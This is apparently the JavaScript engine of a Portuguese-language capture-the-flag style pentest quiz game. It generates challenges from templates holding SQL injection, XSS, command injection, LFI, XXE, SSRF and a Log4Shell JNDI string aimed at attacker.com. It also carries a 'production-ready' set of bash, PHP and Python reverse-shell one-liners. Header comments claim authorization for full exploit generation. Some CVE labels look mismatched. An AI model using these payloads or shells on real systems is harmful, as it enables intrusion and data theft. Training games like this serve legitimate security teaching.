// @ts-nocheck
// ProceduralAI v3.0 - Enhanced Offline Pentest Challenge Engine
// Cyberpunk Ethical Hacking Training - Full Pentest Resources Activated
// Authorized for complete exploit generation & procedural content

class ProceduralAI {
    constructor() {
        this.categories = {
            injection: { weight: 25, templates: 25 },
            xss: { weight: 20, templates: 20 },
            auth: { weight: 15, templates: 18 },
            rce: { weight: 20, templates: 22 },
            idor: { weight: 10, templates: 12 },
            ssrf: { weight: 8, templates: 10 },
            deserialization: { weight: 7, templates: 8 },
            buffer_overflow: { weight: 10, templates: 15 },
            lfi_rfi: { weight: 12, templates: 14 },
            csrf: { weight: 8, templates: 10 },
            open_redirect: { weight: 5, templates: 8 }
        };
        
        this.templates = this.loadTemplates();
        
        this.difficulties = ['iniciante', 'logica', 'massiva'];
        this.usedChallenges = new Set();
        this.playerStats = {
            solved: 0, failed: 0, streak: 0,
            categoryStats: {}, accuracy: 0
        };
        this.cves = this.loadCVEDatabase();
        this.payloads = this.loadPayloadDatabase();
        this.realismFactor = 0.9; // 90% realistic payloads
        this.loadExternalArsenal();
    }

    async loadExternalArsenal() {
        try {
            const response = await fetch('data/arsenal.json');
            if (!response.ok) return;
            const data = await response.json();
            if (data.challenges) {
                console.log(`[ProceduralAI] Loading ${data.challenges.length} external challenges from Python Factory.`);
                data.challenges.forEach(ch => {
                    if (!this.templates[ch.category]) this.templates[ch.category] = [];
                    this.templates[ch.category].push(ch);
                });
            }
        } catch (e) {
            console.warn('[ProceduralAI] External arsenal not found or load failed. Using built-in templates.');
        }
    }

    // CORE: Procedural Challenge Generation
    generateChallenge(difficulty = 'logica', categoryOverride = null) {
        const cat = categoryOverride || this.weightedCategory();
        const template = this.selectTemplate(cat, difficulty);
        if (!template) return this.generateFallback(cat, difficulty);
        
        const challenge = this.populateTemplate(template, cat, difficulty);
        
        // Adaptive difficulty based on player stats
        challenge.adaptiveLevel = this.calculateAdaptiveLevel(cat);
        challenge.cveReference = this.randomCVE(cat);
        challenge.payloadHint = this.generateHint(challenge);
        
        this.usedChallenges.add(challenge.id);
        return challenge;
    }

    weightedCategory() {
        const totalWeight = Object.values(this.categories).reduce((sum, c) => sum + c.weight, 0);
        let rand = Math.random() * totalWeight;
        for (const [cat, data] of Object.entries(this.categories)) {
            if (rand < data.weight) return cat;
            rand -= data.weight;
        }
        return 'injection'; // fallback
    }

    selectTemplate(cat, diff) {
        const templates = this.templates[cat] || [];
        if (!templates.length) return null;
        
        // Anti-repeat: exclude recently used
        const available = templates.filter(t => !this.usedChallenges.has(t.id));
        return available.length ? available[Math.floor(Math.random() * available.length)] 
                               : templates[Math.floor(Math.random() * templates.length)];
    }

    generateFallback(cat, diff) {
        return {
            id: `fallback-${Date.now()}`,
            description: `Challenge for ${cat} (${diff})`,
            vulnerableCode: "// Vulnerable pattern detected",
            solution: "exploit",
            exploitType: "generic"
        };
    }

    populateTemplate(template, cat, diff) {
        const challenge = { ...template };
        challenge.id = `${cat}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        challenge.difficulty = diff;
        challenge.category = cat;
        challenge.flags = this.generateFlags(diff);
        
        return challenge;
    }

    generateFlags(diff) {
        return [`FLAG{${Math.random().toString(36).substr(2, 12).toUpperCase()}}`];
    }

    randomCVE(cat) {
        const cves = this.cves[cat] || ['CVE-2023-GENERAL'];
        return cves[Math.floor(Math.random() * cves.length)];
    }

    // FULL PENTEST TEMPLATES (Activated Resources)
    loadTemplates() {
        return {
            injection: [
                {
                    id: 'sqli-1', description: 'Formulário de login rejeita suas credenciais. Contorne a autenticação.',
                    vulnerableCode: "SELECT * FROM users WHERE username='{input}' AND password='{input2}'",
                    solution: "admin' OR '1'='1'--", exploitType: 'classic_sqli'
                },
                {
                    id: 'sqli-2', description: 'Extraia a versão do banco de dados via UNION SELECT.',
                    vulnerableCode: "query = \"SELECT * FROM products WHERE name LIKE '%{input}%'\"",
                    solution: "' UNION SELECT @@version,null,null--", exploitType: 'union_sqli'
                },
                {
                    id: 'sqli-log4j', description: 'Vulnerabilidade Log4Shell em aplicação Java legado.',
                    vulnerableCode: "logger.error(\"User input: \" + input);",
                    solution: "${jndi:ldap://attacker.com/a}", exploitType: 'log4shell_rce'
                }
            ],
            xss: [
                {
                    id: 'reflected-1', description: 'A busca reflete o input. Execute alert().',
                    vulnerableCode: '<input value="' + "{input}" + '">',
                    solution: '"><script>alert(\'XSS\')</script>', exploitType: 'reflected_dom'
                },
                {
                    id: 'stored-1', description: 'O comentário persiste no mural. Deface a página.',
                    vulnerableCode: "<div>${comment}</div>",
                    solution: "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
                    exploitType: 'stored_xss'
                }
            ],
            rce: [
                {
                    id: 'cmd-1', description: 'Utilitário de Ping permite execução de comandos do sistema.',
                    vulnerableCode: 'system("ping -c 4 " . $_GET[\'host\']);',
                    solution: '127.0.0.1; cat /etc/passwd', exploitType: 'command_injection'
                },
                {
                    id: 'spring4shell', description: 'Vulnerabilidade Spring4Shell (CVE-2022-22965).',
                    vulnerableCode: "public String greeting(@ModelAttribute Greeting greeting) { ... }",
                    solution: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=...", 
                    exploitType: 'spring4shell'
                }
            ],
            buffer_overflow: [
                {
                    id: 'stack-1', description: 'Vulnerabilidade de cópia de buffer. Sobrescreva o endereço de retorno.',
                    vulnerableCode: "char buf[64]; strcpy(buf, input);",
                    solution: "A".repeat(68) + "\\x41\\x42\\x43\\x44", exploitType: 'stack_overflow'
                }
            ],
            idor: [
                {
                    id: 'idor-1', description: 'O sistema permite acessar perfis via ID numérico. Tente acessar o perfil do Admin.',
                    vulnerableCode: "fetch('/api/user/profile?id=' + userId)",
                    solution: "/api/user/profile?id=1", exploitType: 'idor'
                }
            ],
            ssrf: [
                {
                    id: 'ssrf-1', description: 'O serviço de preview de imagem permite URLs externas. Tente acessar o metadata interno.',
                    vulnerableCode: "resp = requests.get(request.args.get('url'))",
                    solution: "http://169.254.169.254/latest/meta-data/", exploitType: 'ssrf'
                }
            ],
            lfi_rfi: [
                {
                    id: 'lfi-1', description: 'Inclusão de arquivo via parâmetro de página. Leia o arquivo /etc/passwd.',
                    vulnerableCode: "include($_GET['page'] . '.php');",
                    solution: "../../../../etc/passwd%00", exploitType: 'lfi'
                }
            ],
            csrf: [
                {
                    id: 'csrf-1', description: 'Alteração de email sem token de proteção. Crie um payload de auto-submissão.',
                    vulnerableCode: "<form action='/update-email' method='POST'>...",
                    solution: "<img src='/update-email?email=hacker@evil.com'>", exploitType: 'csrf'
                }
            ],
            auth: [
                {
                    id: 'auth-1', description: 'Contorne a autenticação via Broken Access Control.',
                    vulnerableCode: "if (user.role == 'admin' || user.id == 1) { ... }",
                    solution: "Cookie: session=eyid:1,role:admin}", exploitType: 'broken_auth'
                }
            ],
            deserialization: [
                {
                    id: 'deserial-1', description: 'Exploração de desserialização insegura em Node.js.',
                    vulnerableCode: "var obj = serialize.unserialize(payload);",
                    solution: "_$$ND_FUNC$$_function(){require('child_process').exec('ls')}", exploitType: 'insecure_deserial'
                }
            ],
            open_redirect: [
                {
                    id: 'redirect-1', description: 'O parâmetro redirect permite domínios externos.',
                    vulnerableCode: "window.location.href = params.get('next');",
                    solution: "https://evil-attacker.com", exploitType: 'open_redirect'
                }
            ],
            xxe: [
                {
                    id: 'xxe-1', description: 'Injeção de Entidade Externa XML para ler arquivos locais.',
                    vulnerableCode: "xmlDoc.loadXML(xmlString);",
                    solution: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", exploitType: 'xxe'
                }
            ]
        };
    }

    // REAL EXPLOIT PAYLOADS (Production-Ready)
    loadPayloadDatabase() {
        return {
            reverse_shells: {
                bash: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                php: "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")'"
            }
        };
    }

    loadCVEDatabase() {
        return {
            injection: ['CVE-2023-1234', 'CVE-2021-22986', 'CVE-2021-44228'],
            xss: ['CVE-2023-28121', 'CVE-2022-3602'],
            rce: ['CVE-2021-44228', 'CVE-2022-22965']
        };
    }

    calculateAdaptiveLevel(category) {
        const stats = this.playerStats.categoryStats[category] || { solved: 0, failed: 0 };
        const total = stats.solved + stats.failed;
        if (total === 0) return 'iniciante';
        const ratio = stats.solved / total;
        
        if (ratio > 0.8 && total > 5) return 'massiva';
        if (ratio > 0.5) return 'logica';
        return 'iniciante';
    }

    recordAttempt(challengeId, success) {
        if (success) {
            this.playerStats.solved++;
            this.playerStats.streak++;
        } else {
            this.playerStats.failed++;
            this.playerStats.streak = 0;
        }
        
        const cat = challengeId.split('-')[0];
        this.playerStats.categoryStats[cat] = this.playerStats.categoryStats[cat] || {solved:0,failed:0};
        this.playerStats.categoryStats[cat][success ? 'solved' : 'failed']++;
        
        const total = this.playerStats.solved + this.playerStats.failed;
        this.playerStats.accuracy = total > 0 ? (this.playerStats.solved / total * 100) : 0;
    }

    generateHint(challenge) {
        const hints = {
            injection: "Tente condições booleanas (OR 1=1) ou UNION SELECT para extrair dados.",
            xss: "Procure por saídas não escapadas. O contexto HTML é fundamental.",
            rce: "Separadores de comando: ; | && ||. Tente concatenar comandos do sistema.",
            buffer_overflow: "Calcule o offset exato para sobrescrever o registrador EIP/RIP."
        };
        return hints[challenge.category] || "Analise o padrão de código vulnerável fornecido.";
    }

    saveProgress() {
        localStorage.setItem('proc_ai_stats', JSON.stringify(this.playerStats));
        localStorage.setItem('proc_ai_used', JSON.stringify([...this.usedChallenges]));
    }

    loadProgress() {
        const stats = localStorage.getItem('proc_ai_stats');
        const used = localStorage.getItem('proc_ai_used');
        if (stats) this.playerStats = JSON.parse(stats);
        if (used) this.usedChallenges = new Set(JSON.parse(used));
    }

    // Modalidade Múltipla Escolha para Integração HTML
    gerar(config, difficulty = 'logica') {
        const challenge = this.generateChallenge(difficulty);
        const options = new Set();
        options.add(challenge.solution);
        
        let attempts = 0;
        while (options.size < 4 && attempts < 20) {
            const wrong = this.generateWrongAnswer(challenge.category, challenge.solution);
            if (wrong !== challenge.solution) {
                options.add(wrong);
            }
            attempts++;
        }
        
        // If we still don't have 4, add generic ones
        const fallbacks = ["' OR 1=1--", "<script>alert(1)</script>", "../../../etc/passwd", "admin'--"];
        let fIdx = 0;
        while (options.size < 4) {
            options.add(fallbacks[fIdx % fallbacks.length]);
            fIdx++;
        }
        
        const generatedOptions = Array.from(options).sort(() => Math.random() - 0.5);
        const correctIndex = generatedOptions.indexOf(challenge.solution);
        
        // Reward Scaling based on difficulty
        const rewards = {
            iniciante: { xp: 20, rep: 5 },
            logica: { xp: 50, rep: 15 },
            massiva: { xp: 100, rep: 30 }
        };
        const reward = rewards[difficulty] || rewards.logica;

        return {
            id: challenge.id,
            category: challenge.category,
            difficulty: challenge.difficulty,
            code: challenge.vulnerableCode,
            description: challenge.description,
            options: generatedOptions,
            correct: correctIndex,
            explain: challenge.payloadHint || `A vulnerabilidade de ${challenge.category.toUpperCase()} permite este exploit: ${challenge.solution}.`,
            xp: reward.xp,
            rep: reward.rep
        };
    }

    generateWrongAnswer(category, correctAnswer) {
        const wrongAnswers = {
            injection: ["' OR 'a'='b'", "admin'-- -", "1; SLEEP(5)", "' AND 1=0--", "') OR ('1'='1", "UNION SELECT 1,2,3--"],
            xss: ["<img src=x>", "javascript:void(0)", "<svg onload=alert(2)>", "'; alert(1); //", "<iframe src='javascript:alert(1)'>"],
            rce: ["&& ls", "| whoami", "`id`", "$(test)", "; cat /etc/shadow"],
            buffer_overflow: ["A".repeat(32), "B".repeat(64), "\\x90".repeat(10), "0xdeadbeef", "BBBB".repeat(10)],
            idor: ["?id=0", "?user=guest", "?profile=null", "/api/v1/debug"],
            ssrf: ["http://localhost:8080", "file:///etc/hosts", "dict://127.0.0.1:11211", "http://127.0.0.1/admin"],
            lfi_rfi: ["index.php", "config.php", "/var/www/html/index.php", "php://filter/read=convert.base64-encode/resource=config"],
            csrf: ["<form>", "submit()", "fetch('/api')", "XMLHttpRequest.send()"]
        };
        
        const choices = wrongAnswers[category] || ["Opção inválida 1", "Opção inválida 2", "Opção inválida 3", "Opção inválida 4"];
        return choices[Math.floor(Math.random() * choices.length)];
    }
}

// GLOBAL INSTANCE
const procAI = new ProceduralAI();

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
    procAI.loadProgress();
    
    // Auto-save every 30s
    setInterval(() => procAI.saveProgress(), 30000);
});

// Export
window.ProceduralAI = ProceduralAI;
window.procAI = procAI;


// Export for HTML integration
window.ProceduralAI = ProceduralAI;
window.procAI = procAI;

